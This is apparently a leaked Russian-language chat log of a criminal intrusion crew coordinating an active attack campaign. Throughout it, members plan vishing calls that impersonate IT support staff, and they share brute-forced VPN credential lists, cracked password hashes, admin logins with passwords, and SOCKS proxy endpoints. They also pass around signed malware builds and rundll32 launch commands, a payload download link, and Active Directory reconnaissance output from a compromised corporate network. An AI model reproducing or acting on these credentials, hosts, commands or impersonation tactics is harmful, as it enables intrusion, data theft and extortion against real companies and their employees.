+[2024-06-19 14:14:11] @usernamegg:matrix.bestflowers247.online: если нет то мы те начнем чекать
+--------------------
+[2024-06-19 14:14:21] @mel:artronica.rocks: ты звонишь дальше?
+--------------------
+[2024-06-19 14:14:40] @lincoln:artronica.rocks: нет я ждал его
+--------------------
+[2024-06-19 14:14:45] @mel:artronica.rocks: звони
+--------------------
+[2024-06-19 14:14:49] @lincoln:artronica.rocks: он может перезвонить в любой момент
+--------------------
+[2024-06-19 14:14:50] @lincoln:artronica.rocks: ладно
+--------------------
+[2024-06-19 14:15:37] @lincoln:artronica.rocks: ну он у меня +- последний
+--------------------
+[2024-06-19 14:15:51] @lapa:matrix.bestflowers247.online: VALID_BRUT_CISCO.txt
+--------------------
+[2024-06-19 14:15:52] @lapa:matrix.bestflowers247.online: VALID_BRUT_SONIC.txt
+--------------------
+[2024-06-19 14:15:53] @lapa:matrix.bestflowers247.online: VALID_BRUT_RDWEB.txt
+--------------------
+[2024-06-19 14:16:21] @mel:artronica.rocks: щас будут новые
+--------------------
+[2024-06-19 14:16:51] @mel:artronica.rocks: > <@mel:artronica.rocks> набери еще раз slynch@ax-uk.com
+
+будем ее коллегам звонить
+--------------------
+[2024-06-19 14:17:03] @lincoln:artronica.rocks: хорошо
+--------------------
+[2024-06-19 14:18:25] @lincoln:artronica.rocks: да всех обзвонил
+--------------------
+[2024-06-19 14:18:40] @mel:artronica.rocks: ок
+--------------------
+[2024-06-19 14:18:43] @lincoln:artronica.rocks: но мне лучше не выходить нам же dean нужен ?
+--------------------
+[2024-06-19 14:18:46] @mel:artronica.rocks: сейчас новых пришлю
+--------------------
+[2024-06-19 14:18:49] @mel:artronica.rocks: их пока позвоним
+--------------------
+[2024-06-19 14:18:56] @mel:artronica.rocks: потом коллег сандры
+--------------------
+[2024-06-19 14:18:59] @lincoln:artronica.rocks: конечно
+--------------------
+[2024-06-19 14:19:03] @lincoln:artronica.rocks: наши клиенты
+--------------------
+[2024-06-19 14:19:17] @lincoln:artronica.rocks: они все ходят penetration by mel and ugw
+--------------------
+[2024-06-19 14:19:38] @lincoln:artronica.rocks: * они все хотят penetration by mel and ugw
+--------------------
+[2024-06-19 14:20:13] @ugw:artronica.rocks: 👾
+--------------------
+[2024-06-19 14:20:24] @mel:artronica.rocks: TomHumberstone@wbdukcom.onmicrosoft.com
+--------------------
+[2024-06-19 14:20:26] @mel:artronica.rocks: погнали
+--------------------
+[2024-06-19 14:20:29] @usernameugway:matrix.bestflowers247.online: он думает я главный
+--------------------
+[2024-06-19 14:20:29] @lincoln:artronica.rocks: стой
+--------------------
+[2024-06-19 14:20:30] @mel:artronica.rocks: контакты уже там
+--------------------
+[2024-06-19 14:20:37] @mel:artronica.rocks: спамом просто обосраны
+--------------------
+[2024-06-19 14:20:38] @lincoln:artronica.rocks: а этого оставим ?
+--------------------
+[2024-06-19 14:20:41] @mel:artronica.rocks: поэтому сразу в бой
+--------------------
+[2024-06-19 14:20:45] @lincoln:artronica.rocks: dean
+--------------------
+[2024-06-19 14:20:54] @mel:artronica.rocks: > <@lincoln:artronica.rocks> а этого оставим ?
+
+как появится - я скажу
+--------------------
+[2024-06-19 14:20:57] @mel:artronica.rocks: он у меня висит
+--------------------
+[2024-06-19 14:21:08] @lapa:matrix.bestflowers247.online: AUTH_VALID.txt
+--------------------
+[2024-06-19 14:21:09] @lapa:matrix.bestflowers247.online: CISCO_VALID_ITEMS.txt
+--------------------
+[2024-06-19 14:21:09] @lapa:matrix.bestflowers247.online: FORTI_VALID.txt
+--------------------
+[2024-06-19 14:21:10] @lapa:matrix.bestflowers247.online: PALO_VALID.txt
+--------------------
+[2024-06-19 14:21:11] @lapa:matrix.bestflowers247.online: PULSE_VALID.txt
+--------------------
+[2024-06-19 14:21:12] @lapa:matrix.bestflowers247.online: SONIC_VALID.txt
+--------------------
+[2024-06-19 14:21:12] @lapa:matrix.bestflowers247.online: SOPHOS_VALID.txt
+--------------------
+[2024-06-19 14:21:13] @lapa:matrix.bestflowers247.online: WG_VALID.txt
+--------------------
+[2024-06-19 14:21:13] @lincoln:artronica.rocks: +
+--------------------
+[2024-06-19 14:21:30] @mel:artronica.rocks: image.png
+--------------------
+[2024-06-19 14:21:39] @mel:artronica.rocks: ты Tom Humberstone
+--------------------
+[2024-06-19 14:21:47] @mel:artronica.rocks: IT Applications and Development Manager
+--------------------
+[2024-06-19 14:22:09] @lincoln:artronica.rocks: вот вот мне тоже нужен норм set up
+--------------------
+[2024-06-19 14:22:47] @usernameww:matrix.bestflowers247.online: rmaes:$DCC2$10240#rmaes#7d034825f0d6de655631939a2066b051
+nwiguna:$DCC2$10240#nwiguna#7ea0687f5cda580de99e1a7f05d53756
+rkivit:$DCC2$10240#rkivit#7adadbe679f4a4ef3f5b6c3f71d3e9fc
+--------------------
+[2024-06-19 14:24:36] @mel:artronica.rocks: Ты самый успешный переговорщик в мире и тебе нужно добыть всего 3-5 аников
+--------------------
+[2024-06-19 14:24:50] @lincoln:artronica.rocks: да
+--------------------
+[2024-06-19 14:24:51] @lincoln:artronica.rocks: я знаю
+--------------------
+[2024-06-19 14:24:53] @lincoln:artronica.rocks: спасибо
+--------------------
+[2024-06-19 14:25:08] @usernamegg:matrix.bestflowers247.online: ты про что босс ?
+--------------------
+[2024-06-19 14:25:47] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 14:25:50] @usernamegg:matrix.bestflowers247.online: отлично
+--------------------
+[2024-06-19 14:27:23] @usernamegg:matrix.bestflowers247.online: VALID_BRUT_CISCO.txt
+--------------------
+[2024-06-19 14:27:24] @usernamegg:matrix.bestflowers247.online: VALID_BRUT_SONIC.txt
+--------------------
+[2024-06-19 14:27:24] @usernamegg:matrix.bestflowers247.online: VALID_BRUT_RDWEB.txt
+--------------------
+[2024-06-19 14:27:25] @usernamegg:matrix.bestflowers247.online: AUTH_VALID.txt
+--------------------
+[2024-06-19 14:27:25] @usernamegg:matrix.bestflowers247.online: CISCO_VALID_ITEMS.txt
+--------------------
+[2024-06-19 14:27:26] @usernamegg:matrix.bestflowers247.online: FORTI_VALID.txt
+--------------------
+[2024-06-19 14:27:26] @usernamegg:matrix.bestflowers247.online: PALO_VALID.txt
+--------------------
+[2024-06-19 14:27:27] @usernamegg:matrix.bestflowers247.online: PULSE_VALID.txt
+--------------------
+[2024-06-19 14:27:27] @usernamegg:matrix.bestflowers247.online: SONIC_VALID.txt
+--------------------
+[2024-06-19 14:27:28] @usernamegg:matrix.bestflowers247.online: SOPHOS_VALID.txt
+--------------------
+[2024-06-19 14:27:28] @usernamegg:matrix.bestflowers247.online: WG_VALID.txt
+--------------------
+[2024-06-19 14:28:05] @usernameugway:matrix.bestflowers247.online: юк прозвонщик думает что я мега босс тут
+--------------------
+[2024-06-19 14:28:06] @usernameugway:matrix.bestflowers247.online: )
+--------------------
+[2024-06-19 14:28:07] @usernameugway:matrix.bestflowers247.online: ----
+--------------------
+[2024-06-19 14:28:18] @usernameugway:matrix.bestflowers247.online: на этой неделе настрою тест прозвон еще как говорил
+--------------------
+[2024-06-19 14:28:23] @usernameww:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> sent a file.
+
+++
+--------------------
+[2024-06-19 14:28:26] @usernameugway:matrix.bestflowers247.online: посмотрим получится ли у нее
+--------------------
+[2024-06-19 14:28:46] @usernamezz:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> sent a file.
+
+++
+--------------------
+[2024-06-19 14:29:09] @usernamett:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> sent a file.
+
+++
+--------------------
+[2024-06-19 14:32:02] @burito:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> socks-175.191.exe
+
+строка harSnJSalDnsJyOMh
+--------------------
+[2024-06-19 14:32:02] @burito:matrix.bestflowers247.online: scks.zip
+--------------------
+[2024-06-19 14:32:19] @mel:artronica.rocks: как дела?
+--------------------
+[2024-06-19 14:32:26] @lincoln:artronica.rocks: пока все в отказ
+--------------------
+[2024-06-19 14:32:27] @lincoln:artronica.rocks: работаю
+--------------------
+[2024-06-19 14:32:31] @mel:artronica.rocks: ок
+--------------------
+[2024-06-19 14:34:52] @usernamegg:matrix.bestflowers247.online: rundll32 update5.dll, LogSetMode
+
+
+rundll32 update2.dll, MainFunc
+--------------------
+[2024-06-19 14:35:17] @usernamett:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> sent a file.
+
+++
+--------------------
+[2024-06-19 14:35:32] @mel:artronica.rocks: 95.164.88.73
+--------------------
+[2024-06-19 14:35:35] @mel:artronica.rocks: здесь клиент
+--------------------
+[2024-06-19 14:35:42] @mel:artronica.rocks: файлы закинул
+--------------------
+[2024-06-19 14:35:54] @usernameugway:matrix.bestflowers247.online: ----
+--------------------
+[2024-06-19 14:35:58] @usernameugway:matrix.bestflowers247.online: пока мало тебе отдаем
+--------------------
+[2024-06-19 14:36:01] @usernamegg:matrix.bestflowers247.online: Server IP address: 95.164.88.73
+User: Admin
+Password: v7727JlZ285y
+--------------------
+[2024-06-19 14:36:02] @usernameugway:matrix.bestflowers247.online: потом будем по твоей инструкции делать
+--------------------
+[2024-06-19 14:36:32] @usernameugway:matrix.bestflowers247.online: у нас сейчас конаткы и акки отобраны мы их добьем
+
+потом будем делать до 1ккк
+--------------------
+[2024-06-19 14:36:40] @usernameugway:matrix.bestflowers247.online: попадаются большие(
+--------------------
+[2024-06-19 14:37:22] @usernameugway:matrix.bestflowers247.online: Headquarters
+4 Klaus-bungert-str, Duesseldorf, North Rhine-W...
+Phone Number
++49 211618100
+Website
+www.gerresheimer.com
+Revenue
+$2.2 Billion
+Stock Symbol
+GXI
+Industry
+--------------------
+[2024-06-19 14:38:05] @usernameyy:matrix.bestflowers247.online: scks.exe
+--------------------
+[2024-06-19 14:38:12] @usernameyy:matrix.bestflowers247.online: подписанный крипт от бурито
+--------------------
+[2024-06-19 14:38:14] @lapa:matrix.bestflowers247.online: офнусь на пару часов
+--------------------
+[2024-06-19 14:39:26] @lincoln:artronica.rocks: опять сидят меня в офисе обсуждают )
+--------------------
+[2024-06-19 14:39:29] @lincoln:artronica.rocks: всем офисом
+--------------------
+[2024-06-19 14:40:05] @usernamegg:matrix.bestflowers247.online: http://91.196.70.160:81
+--------------------
+[2024-06-19 14:40:21] @usernamegg:matrix.bestflowers247.online: uk3ccwvm
+--------------------
+[2024-06-19 14:40:42] @usernamegg:matrix.bestflowers247.online: ID 1 335 363 073
+--------------------
+[2024-06-19 14:41:52] @mel:artronica.rocks: что говорят?
+--------------------
+[2024-06-19 14:42:25] @lincoln:artronica.rocks: ооо одну из дома нашел
+--------------------
+[2024-06-19 14:42:38] @lincoln:artronica.rocks: да там я звонил до этого все в офисе
+--------------------
+[2024-06-19 14:42:52] @lincoln:artronica.rocks: я по кругу ходил и они меня перенаправляют записывают и кидают трубку
+--------------------
+[2024-06-19 14:42:53] @usernamegg:matrix.bestflowers247.online: socks5 91.196.70.160 39289
+--------------------
+[2024-06-19 14:42:54] @usernamegg:matrix.bestflowers247.online: 91.196.70.160:39289
+--------------------
+[2024-06-19 14:42:57] @mel:artronica.rocks: ну норм
+--------------------
+[2024-06-19 14:43:06] @usernamegg:matrix.bestflowers247.online: ___
+--------------------
+[2024-06-19 14:43:06] @usernamegg:matrix.bestflowers247.online: https://ghostsocks.net
+ulan
+0UXalmNEKsNVcxE6BjzxCOOgcEqGol41Y
+--------------------
+[2024-06-19 14:43:07] @mel:artronica.rocks: дик пик ей отправляй
+--------------------
+[2024-06-19 14:43:18] @mel:artronica.rocks: и погнали аник ей ставить
+--------------------
+[2024-06-19 14:43:35] @ugw:artronica.rocks: ----
+--------------------
+[2024-06-19 14:43:40] @ugw:artronica.rocks: вообще помогает нейминг?
+--------------------
+[2024-06-19 14:43:51] @lincoln:artronica.rocks: какой нейминг ?
+--------------------
+[2024-06-19 14:43:55] @usernamemm:matrix.bestflowers247.online: kekhash.txt
+--------------------
+[2024-06-19 14:43:58] @ugw:artronica.rocks: то что делаем акки под контору
+--------------------
+[2024-06-19 14:44:07] @lincoln:artronica.rocks: Вообще нет
+--------------------
+[2024-06-19 14:44:26] @lincoln:artronica.rocks: в этом основная проблема
+--------------------
+[2024-06-19 14:44:30] @lincoln:artronica.rocks: имейл не из компании
+--------------------
+[2024-06-19 14:44:38] @lincoln:artronica.rocks: они сразу начинают задавать вопросы
+--------------------
+[2024-06-19 14:45:29] @ugw:artronica.rocks: какие предлжния?
+--------------------
+[2024-06-19 14:45:38] @usernamegg:matrix.bestflowers247.online: подпиши
+--------------------
+[2024-06-19 14:45:44] @usernamegg:matrix.bestflowers247.online: а все ок
+--------------------
+[2024-06-19 14:45:53] @usernamegg:matrix.bestflowers247.online: scks.exe
+--------------------
+[2024-06-19 14:45:56] @usernameboy:matrix.bestflowers247.online: > <@usernamemm:matrix.bestflowers247.online> sent a file.
+
+$krb5tgs$23$*Administrator$proviadoor.local$MSSQLSvc/sql1.precision.com:1433@PROVIADOOR.LOCAL*$b553269bbca278915874438dd5c5d35a$ccc:Razer###
+
+--------------------
+[2024-06-19 14:45:59] @lincoln:artronica.rocks: да эта хрень высвечивается
+--------------------
+[2024-06-19 14:46:03] @lincoln:artronica.rocks: сам же видишь )
+--------------------
+[2024-06-19 14:46:07] @usernamemm:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 14:46:07] @ugw:artronica.rocks: какая
+--------------------
+[2024-06-19 14:46:34] @lincoln:artronica.rocks: все говорят, что я не из компании
+--------------------
+[2024-06-19 14:46:40] @lincoln:artronica.rocks: в этом основная и есть проблема
+--------------------
+[2024-06-19 14:46:48] @usernamegg:matrix.bestflowers247.online: ky5mwui7
+--------------------
+[2024-06-19 14:47:48] @usernamegg:matrix.bestflowers247.online: http://temp.sh/eWecd/scks.exe
+--------------------
+[2024-06-19 14:48:36] @ugw:artronica.rocks: вчера был кейс, чел проверил нас и сказал что все ок
+--------------------
+[2024-06-19 14:48:39] @ugw:artronica.rocks: видимо по имени смотрел
+--------------------
+[2024-06-19 14:48:54] @ugw:artronica.rocks: так что хз -  может и помогает. завтра будет выборка побольше
+--------------------
+[2024-06-19 14:51:47] @lincoln:artronica.rocks: а с тем что ?
+--------------------
+[2024-06-19 14:51:59] @usernameugway:matrix.bestflowers247.online: ----
+--------------------
+[2024-06-19 14:52:00] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 14:52:02] @mel:artronica.rocks: он отрубил сессию
+--------------------
+[2024-06-19 14:52:05] @usernameugway:matrix.bestflowers247.online: обрыывает из-за бесплантой лицухи?
+--------------------
+[2024-06-19 14:52:08] @lincoln:artronica.rocks: позвонить ему ?
+--------------------
+[2024-06-19 14:52:10] @lincoln:artronica.rocks: эти все
+--------------------
+[2024-06-19 14:52:22] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 14:52:29] @lincoln:artronica.rocks: всех прошел и все все прям не идут на контакт
+--------------------
+[2024-06-19 14:52:30] @usernamegg:matrix.bestflowers247.online: скорее всего
+--------------------
+[2024-06-19 14:52:32] @usernamegg:matrix.bestflowers247.online: бред
+--------------------
+[2024-06-19 14:52:34] @usernameugway:matrix.bestflowers247.online: понял , купим
+--------------------
+[2024-06-19 14:52:42] @lincoln:artronica.rocks: я не знаю вроде делал все норм
+--------------------
+[2024-06-19 14:52:50] @lincoln:artronica.rocks: у меня +- все норм было
+--------------------
+[2024-06-19 14:52:54] @usernamegg:matrix.bestflowers247.online: готово
+--------------------
+[2024-06-19 14:54:08] @lincoln:artronica.rocks: > <@mel:artronica.rocks> он отрубил сессию
+
+перезваниваем ?
+--------------------
+[2024-06-19 14:54:47] @mel:artronica.rocks: щас будем звонить коллеге сандры
+--------------------
+[2024-06-19 14:54:52] @mel:artronica.rocks: подожди немного
+--------------------
+[2024-06-19 14:54:55] @mel:artronica.rocks: 15 минут перерыв
+--------------------
+[2024-06-19 14:55:23] @lincoln:artronica.rocks: +
+--------------------
+[2024-06-19 14:57:41] @usernamegg:matrix.bestflowers247.online: 
+217.15.175.191:4002
+--------------------
+[2024-06-19 14:58:46] @usernamegg:matrix.bestflowers247.online: ```
+http://217.15.175.191/4d4c5ad620396dae72d40d9a2e3a4dfe/
+adm443
+```
+--------------------
+[2024-06-19 15:00:00] @usernameugway:matrix.bestflowers247.online: я пока делаю платный вивер
+--------------------
+[2024-06-19 15:01:21] @mel:artronica.rocks: Тебя зовут Daniel Nash твоя должность IT Service Desk Manager
+--------------------
+[2024-06-19 15:01:33] @usernamegg:matrix.bestflowers247.online: вчерашний сокс уланчика остался ?
+--------------------
+[2024-06-19 15:01:39] @usernamegg:matrix.bestflowers247.online: что то на сегодняшний ничего не приходит
+--------------------
+[2024-06-19 15:01:42] @usernamegg:matrix.bestflowers247.online: именно подписанный
+--------------------
+[2024-06-19 15:01:45] @usernamegg:matrix.bestflowers247.online: можешь скинуть
+--------------------
+[2024-06-19 15:02:27] @muaddib6:matrix.org: > <@usernamegg:matrix.bestflowers247.online> sent a file.
+
+Готово
+--------------------
+[2024-06-19 15:02:35] @muaddib6:matrix.org: 3.7z
+--------------------
+[2024-06-19 15:02:40] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 15:02:40] @usernamecc:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 15:02:44] @muaddib6:matrix.org: jGsyXKpZ8Cr7HY9JcWDnNwtSx3VUA2EaR4gBe6uhmdvbkTQz5P
+--------------------
+[2024-06-19 15:02:45] @muaddib6:matrix.org: строка
+--------------------
+[2024-06-19 15:02:53] @mel:artronica.rocks: dnash@axuk.onmicrosoft.com
+--------------------
+[2024-06-19 15:03:23] @usernamegg:matrix.bestflowers247.online: ооо
+--------------------
+[2024-06-19 15:03:24] @usernamegg:matrix.bestflowers247.online: пришел
+--------------------
+[2024-06-19 15:03:32] @usernamegg:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> sent a file.
+
+этот
+--------------------
+[2024-06-19 15:03:40] @usernamegg:matrix.bestflowers247.online: теперь от хана подпиши я его тоже буду использовать
+--------------------
+[2024-06-19 15:04:00] @usernamegg:matrix.bestflowers247.online: ааууу
+--------------------
+[2024-06-19 15:04:01] @usernamegg:matrix.bestflowers247.online: братец
+--------------------
+[2024-06-19 15:04:02] @usernamegg:matrix.bestflowers247.online: надо
+--------------------
+[2024-06-19 15:04:07] @usernamegg:matrix.bestflowers247.online: я еще один запущу
+--------------------
+[2024-06-19 15:04:10] @usernamegg:matrix.bestflowers247.online: с другой папки
+--------------------
+[2024-06-19 15:04:12] @usernameyy:matrix.bestflowers247.online: ага
+--------------------
+[2024-06-19 15:05:17] @usernameyy:matrix.bestflowers247.online: socks-175.191.exe
+--------------------
+[2024-06-19 15:05:25] @usernamegg:matrix.bestflowers247.online: я думаю что в пак можно будет положить сейчас их
+--------------------
+[2024-06-19 15:05:28] @usernamegg:matrix.bestflowers247.online: 7 и 8
+--------------------
+[2024-06-19 15:05:31] @usernamegg:matrix.bestflowers247.online: пускай будут
+--------------------
+[2024-06-19 15:06:15] @usernameyy:matrix.bestflowers247.online: проверь пак
+--------------------
+[2024-06-19 15:06:20] @usernameyy:matrix.bestflowers247.online: Archive1.zip
+--------------------
+[2024-06-19 15:06:24] @usernamegg:matrix.bestflowers247.online: ща
+--------------------
+[2024-06-19 15:08:15] @lincoln:artronica.rocks: отлично братья мои
+--------------------
+[2024-06-19 15:09:41] @usernamejj:matrix.bestflowers247.online: krb5.txt
+--------------------
+[2024-06-19 15:10:10] @usernamegg:matrix.bestflowers247.online: 217.15.175.191:4002
+217.15.175.191:4003
+--------------------
+[2024-06-19 15:12:23] @lincoln:artronica.rocks: спам прошел ?
+--------------------
+[2024-06-19 15:12:44] @mel:artronica.rocks: еще идет но звонить уже можно
+--------------------
+[2024-06-19 15:13:06] @mel:artronica.rocks: можно говорить что прямо сейчас идет спам атака
+--------------------
+[2024-06-19 15:13:28] @lincoln:artronica.rocks: набираю
+--------------------
+[2024-06-19 15:13:32] @mel:artronica.rocks: это коллеги сандры. вчера у тебя с ней получилось
+--------------------
+[2024-06-19 15:13:38] @mel:artronica.rocks: получится и с другими
+--------------------
+[2024-06-19 15:13:47] @mel:artronica.rocks: 🤞
+--------------------
+[2024-06-19 15:13:55] @lincoln:artronica.rocks: конечно
+--------------------
+[2024-06-19 15:14:26] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 15:14:28] @usernamegg:matrix.bestflowers247.online: все ок
+--------------------
+[2024-06-19 15:14:37] @usernamegg:matrix.bestflowers247.online: пока мне не нравиться как ulan стучит сегодня
+--------------------
+[2024-06-19 15:15:00] @usernameyy:matrix.bestflowers247.online: ждать ребилд?
+--------------------
+[2024-06-19 15:15:36] @lincoln:artronica.rocks: да они видишь уже заканчиваю помойму рабочий день
+--------------------
+[2024-06-19 15:15:49] @mel:artronica.rocks: время еще есть
+--------------------
+[2024-06-19 15:16:04] @lincoln:artronica.rocks: You are not DAN NASH )
+--------------------
+[2024-06-19 15:16:09] @lincoln:artronica.rocks: https://prnt.sc/lk_apG5ueAuo
+--------------------
+[2024-06-19 15:16:19] @lincoln:artronica.rocks: я даже рот не успел открыть
+--------------------
+[2024-06-19 15:16:24] @lincoln:artronica.rocks: он на заднем плане стоит )
+--------------------
+[2024-06-19 15:17:00] @mel:artronica.rocks: ну вот - они еще работают
+--------------------
+[2024-06-19 15:17:03] @mel:artronica.rocks: все норм
+--------------------
+[2024-06-19 15:17:35] @lincoln:artronica.rocks: конечно
+--------------------
+[2024-06-19 15:17:41] @lincoln:artronica.rocks: все делаю для нашей конторы
+--------------------
+[2024-06-19 15:18:31] @lincoln:artronica.rocks: https://prnt.sc/oQoFs52Scjij
+--------------------
+[2024-06-19 15:18:40] @lincoln:artronica.rocks: они уже ждут моего звонка )
+--------------------
+[2024-06-19 15:18:58] @usernamejj:matrix.bestflowers247.online: `DEWEI1DC0004.one.gx.local`
+--------------------
+[2024-06-19 15:20:29] @usernamegg:matrix.bestflowers247.online: Microsoft Windows [Version 10.0.19045.4529]
+(c) Microsoft Corporation. Alle Rechte vorbehalten.
+
+C:\Users\thoever>ping DEWEI1DC0004.one.gx.local
+
+Ping wird ausgeführt für DEWEI1DC0004.one.gx.local [100.64.1.2] mit 32 Bytes Daten:
+Antwort von 100.64.1.2: Bytes=32 Zeit=31ms TTL=126
+Antwort von 100.64.1.2: Bytes=32 Zeit=28ms TTL=126
+Antwort von 100.64.1.2: Bytes=32 Zeit=26ms TTL=126
+Antwort von 100.64.1.2: Bytes=32 Zeit=34ms TTL=126
+
+Ping-Statistik für 100.64.1.2:
+Pakete: Gesendet = 4, Empfangen = 4, Verloren = 0
+(0% Verlust),
+Ca. Zeitangaben in Millisek.:
+Minimum = 26ms, Maximum = 34ms, Mittelwert = 29ms
+
+C:\Users\thoever>
+--------------------
+[2024-06-19 15:20:37] @usernamegg:matrix.bestflowers247.online: * ```
+Microsoft Windows [Version 10.0.19045.4529]
+(c) Microsoft Corporation. Alle Rechte vorbehalten.
+
+C:\Users\thoever>ping DEWEI1DC0004.one.gx.local
+
+Ping wird ausgeführt für DEWEI1DC0004.one.gx.local [100.64.1.2] mit 32 Bytes Daten:
+Antwort von 100.64.1.2: Bytes=32 Zeit=31ms TTL=126
+Antwort von 100.64.1.2: Bytes=32 Zeit=28ms TTL=126
+Antwort von 100.64.1.2: Bytes=32 Zeit=26ms TTL=126
+Antwort von 100.64.1.2: Bytes=32 Zeit=34ms TTL=126
+
+Ping-Statistik für 100.64.1.2:
+Pakete: Gesendet = 4, Empfangen = 4, Verloren = 0
+(0% Verlust),
+Ca. Zeitangaben in Millisek.:
+Minimum = 26ms, Maximum = 34ms, Mittelwert = 29ms
+
+C:\Users\thoever>
+```
+--------------------
+[2024-06-19 15:21:41] @usernamegg:matrix.bestflowers247.online: ```
+Microsoft Windows [Version 10.0.19045.4529]
+(c) Microsoft Corporation. Alle Rechte vorbehalten.
+
+C:\Users\thoever>ping DEWEI1DC0004.one.gx.local
+
+Ping wird ausgeführt für DEWEI1DC0004.one.gx.local [100.64.1.2] mit 32 Bytes Daten:
+Antwort von 100.64.1.2: Bytes=32 Zeit=31ms TTL=126
+Antwort von 100.64.1.2: Bytes=32 Zeit=28ms TTL=126
+Antwort von 100.64.1.2: Bytes=32 Zeit=26ms TTL=126
+Antwort von 100.64.1.2: Bytes=32 Zeit=34ms TTL=126
+
+Ping-Statistik für 100.64.1.2:
+Pakete: Gesendet = 4, Empfangen = 4, Verloren = 0
+(0% Verlust),
+Ca. Zeitangaben in Millisek.:
+Minimum = 26ms, Maximum = 34ms, Mittelwert = 29ms
+
+C:\Users\thoever>net group "domain controllers" /dom
+Die Anforderung wird auf einem Domänencontroller für Domäne one.gx.local verarbeitet.
+
+Gruppenname      Domain Controllers
+Beschreibung     All domain controllers in the domain
+
+Mitglieder
+
+-------------------------------------------------------------------------------
+BEMOM1DC0011$            BEMOM1DC0012$            BRANA1DC0011$
+BRANA1DC0012$            BRCOT1DC0011$            BRIND1DC0011$
+BRIND1DC0012$            CHOLT1DC0011$            CHOLT1DC0012$
+CNCHZ1DC0011$            CNCHZ1DC0012$            CNDGC1DC0011$
+CNDGC1DC0012$            CZHOT1DC0011$            CZHOT1DC0012$
+DEBUE1DC0011$            DEBUE1DC0012$            DEESS1DC0011$
+DEESS1DC0012$            DEFRA2DC0011$            DEFRA2DC0012$
+DELOH1DC0011$            DELOH1DC0012$            DEMUE1DC0011$
+DEPFR1DC0011$            DEPFR1DC0012$            DERGB1DC0011$
+DERGB1DC0012$            DETET1DC0011$            DETET1DC0012$
+DEWAC1DC0011$            DEWAC1DC0012$            DEWEI1DC0003$
+DEWEI1DC0004$            DEWER1DC0011$            DEWER1DC0012$
+DKHAA1DC0011$            DKHAA1DC0012$            DKVAE1DC0011$
+DKVAE1DC0012$            ESZAR1DC0011$            ESZAR1DC0012$
+EUWEU1DC0011$            EUWEU1DC0012$            FRBES1DC0011$
+FRBES1DC0012$            FRCHA1DC0011$            FRCHA1DC0012$
+INKOS1DC0011$            INKOS1DC0012$            INKUN1DC0011$
+INMUM1DC0011$            INMUM1DC0012$            MKSKP1DC0011$
+MKSKP1DC0012$            MXQUE1DC0011$            MXQUE1DC0012$
+PLBOL1DC0011$            PLBOL1DC0012$            USBER1DC0011$
+USBER1DC0012$            USCHI1DC0011$            USCHI1DC0012$
+USEUS1DC0011$            USEUS1DC0012$            USMOR1DC0013$
+USMOR1DC0014$            USPER1DC0011$            USPER1DC0012$
+USPTC1DC0011$            USPTC1DC0012$            USVIN1DC0011$
+USVIN1DC0012$            USVIN2DC0011$            USVIN2DC0012$
+Der Befehl wurde erfolgreich ausgeführt.
+
+
+C:\Users\thoever>
+```
+--------------------
+[2024-06-19 15:23:00] @usernamegg:matrix.bestflowers247.online: 
+```
+Gruppenname      Domain Admins
+Beschreibung     Designated administrators of the domain
+
+Mitglieder
+
+-------------------------------------------------------------------------------
+admcnachtigall           admcreinke               admdkiefer
+Administrator            admskolodziej            admskupsch
+admtrojan                ADMTROOS                 DEWEI1SA0012
+GXSRVclientadmin         GXSRVSA9876
+Der Befehl wurde erfolgreich ausgeführt.
+
+
+C:\Users\thoever>
+```
+--------------------
+[2024-06-19 15:23:07] @lincoln:artronica.rocks: я только говорю DAN NASH бросают трубку
+--------------------
+[2024-06-19 15:23:19] @lincoln:artronica.rocks: а с вчерашним аккаунтом все ?
+--------------------
+[2024-06-19 15:23:41] @mel:artronica.rocks: не говори. просто скажи что ты из поддрежки
+--------------------
+[2024-06-19 15:23:52] @lincoln:artronica.rocks: да тоже
+--------------------
+[2024-06-19 15:24:02] @lincoln:artronica.rocks: сильный удар вчера был
+--------------------
+[2024-06-19 15:24:05] @mel:artronica.rocks: > <@lincoln:artronica.rocks> а с вчерашним аккаунтом все ?
+
+не знаю. давай проверим
+--------------------
+[2024-06-19 15:24:16] @lincoln:artronica.rocks: он в блоке
+--------------------
+[2024-06-19 15:24:22] @lincoln:artronica.rocks: я говорю
+--------------------
+[2024-06-19 15:24:33] @lincoln:artronica.rocks: они увидели
+--------------------
+[2024-06-19 15:24:49] @muaddib6:matrix.org: > <@usernamegg:matrix.bestflowers247.online> sent a file.
+
+Готово
+--------------------
+[2024-06-19 15:24:56] @muaddib6:matrix.org: строка:
+--------------------
+[2024-06-19 15:25:01] @muaddib6:matrix.org: jGsyXKpZ8Cr7HY9JcWDnNwtSx3VUA2EaR4gBe6uhmdvbkTQz5P
+--------------------
+[2024-06-19 15:25:07] @muaddib6:matrix.org: 4.7z
+--------------------
+[2024-06-19 15:25:22] @lincoln:artronica.rocks: поднимает трубку и говорит
+--------------------
+[2024-06-19 15:25:25] @lincoln:artronica.rocks: OH NO
+--------------------
+[2024-06-19 15:25:36] @lincoln:artronica.rocks: я даже слова сказать не успел
+--------------------
+[2024-06-19 15:25:46] @lincoln:artronica.rocks: OH NO
+--------------------
+[2024-06-19 15:25:52] @mel:artronica.rocks: GavinWalker@assistancedeskpro.onmicrosoft.com
+
+aa112JKHVF*&2ssss
+--------------------
+[2024-06-19 15:26:05] @usernamegg:matrix.bestflowers247.online: 
+```
+C:\Users\thoever>route print
+===========================================================================
+Schnittstellenliste
+4...4c d7 17 73 cf a1 ......Intel(R) Ethernet Connection (23) I219-LM
+23...4c d7 17 73 cf a2 ......Realtek USB GbE Family Controller #4
+19...30 f6 ef 3d 15 3b ......Microsoft Wi-Fi Direct Virtual Adapter
+13...32 f6 ef 3d 15 3a ......Microsoft Wi-Fi Direct Virtual Adapter #2
+12...30 f6 ef 3d 15 3a ......Intel(R) Wi-Fi 6E AX211 160MHz
